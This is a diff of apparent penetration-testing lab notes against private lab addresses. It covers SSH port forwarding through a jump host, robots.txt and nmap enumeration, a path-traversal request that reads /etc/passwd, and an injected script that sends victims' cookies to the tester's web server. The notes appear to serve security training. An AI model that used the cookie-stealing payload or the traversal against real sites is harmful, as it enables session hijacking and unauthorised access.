@@ -70,6 +70,7 @@ ssh -S /tmp/120 120 -O cancel -D 9050
 
 
 --------------------------------------------------------------DAY 2------------------------------------------------------
+DEMO
 #enumerate robots.txt
         User-agent: *
         Allow: /uploads
@@ -148,4 +149,25 @@ http://10.50.28.11/path/pathdemo.php?myfile=../../../../../../../../etc/passwd
 python3 -m http.server
 #add script to server that redirects victim to your web server and sends you cookie
 <script>document.location="http://10.50.40.70:8000/?" + document.cookie;</script>
+DEMO^^^
+#set up port forward to http and ssh
+ssh -S /tmp/jump jump -O forward -L 5150:10.100.28.40:80 5151:10.100.28.40:4444
+# Robots.txt
+        User-agent: *
+        Disallow: /net_test
+#nmap scan 
+nmap --script=http-enum 10.50.28.11 -T5 -vvvv
+         /robots.txt: Robots file
+        |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+        |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+        |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+#/net_test contains industry_check.php
+Allows Commands to be run from middle box
+#uploads contains document containing a message 
+        Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
+        Please send me a corrected cert with the right now.
         
+        I took my online training from the following website
+        
+        10.100.28.55
+
